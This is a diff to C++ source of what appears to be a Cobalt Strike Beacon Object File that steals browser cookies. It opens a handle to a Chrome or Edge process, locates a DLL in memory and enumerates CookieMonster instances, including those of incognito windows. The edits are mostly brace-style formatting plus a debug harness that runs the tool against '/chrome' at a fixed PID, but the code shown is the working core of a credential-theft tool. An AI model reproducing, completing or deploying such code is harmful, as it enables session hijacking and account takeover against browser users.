@@ -55,7 +55,7 @@ extern "C" {
     */
     void go(char* args, int len) {
         banner();
-        BeaconPrintf(CALLBACK_OUTPUT, "Kittens love cookies too! >:3\n\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "Kittens love cookies too! >:3\n");
 
         DWORD chromePid = 0;
         LPCSTR targetConfig = NULL;
@@ -108,8 +108,7 @@ extern "C" {
             for (size_t i = 0; i < szActualPattern; ++i) //Oh god the sphaghetti is everywhere!
                 pattern[i] = edgePattern[i];
         }
-        else
-        {
+        else {
             BeaconPrintf(CALLBACK_ERROR, "No target type specified! Use /edge or /chrome to specify target!\n");
             return;
         }
@@ -117,8 +116,7 @@ extern "C" {
         HANDLE hChrome;
         if (chromePid != 0) {
             BeaconPrintf(CALLBACK_OUTPUT, "Using the supplied PID: %d\n", chromePid);
-            if (!GetChromeHandle(chromePid, &hChrome))
-            {
+            if (!GetChromeHandle(chromePid, &hChrome)) {
                 BeaconPrintf(CALLBACK_ERROR, "Failed to get handle\n");
                 return;
             }
@@ -134,8 +132,7 @@ extern "C" {
 
         uintptr_t baseAddress = 0;
         DWORD moduleSize = 0;
-        if (!GetRemoteModuleBaseAddress(hChrome, dllName, baseAddress, &moduleSize))
-        {
+        if (!GetRemoteModuleBaseAddress(hChrome, dllName, baseAddress, &moduleSize)) {
             BeaconPrintf(CALLBACK_ERROR, "Failed to find %ls base address!\n", dllName);
             CloseHandle(hChrome);
             return;
@@ -175,17 +172,18 @@ extern "C" {
             CloseHandle(hChrome);
             free(CookieMonsterInstances);
             return;
-    }
+        }
+
 #ifdef _DEBUG
-        BeaconPrintf(CALLBACK_OUTPUT, "Found %zu instances of CookieMonster!\n", szCookieMonster);
+        BeaconPrintf(CALLBACK_OUTPUT, "Found %Iu instances of CookieMonster!\n", szCookieMonster);
 
         for (size_t i = 0; i < szCookieMonster; i++)
             BeaconPrintf(CALLBACK_OUTPUT, "Found CookieMonster on 0x%p\n", (void*)CookieMonsterInstances[i]);
 #endif
+
         //I don't know that the first instance of the CookieMonster is supposed to be, but the CookieMap for it seems to always be empty
         //Each incognito window will have their own instance of the CookieMonster, and that is why we need to find and loop them all
-        for (size_t i = 0; i < szCookieMonster; i++)
-        {
+        for (size_t i = 0; i < szCookieMonster; i++) {
             if (CookieMonsterInstances == NULL || CookieMonsterInstances[i] == NULL)
                 break;
 
@@ -208,9 +206,7 @@ extern "C" {
 #if defined(_DEBUG) && !defined(_GTEST)
 
 int main(int argc, char* argv[]) {
-    // Run BOF's entrypoint
-    // To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
-    bof::runMocked<>(go);
+    bof::runMocked<const char*, int>(go, "/chrome", 9228);
     return 0;
 }
 
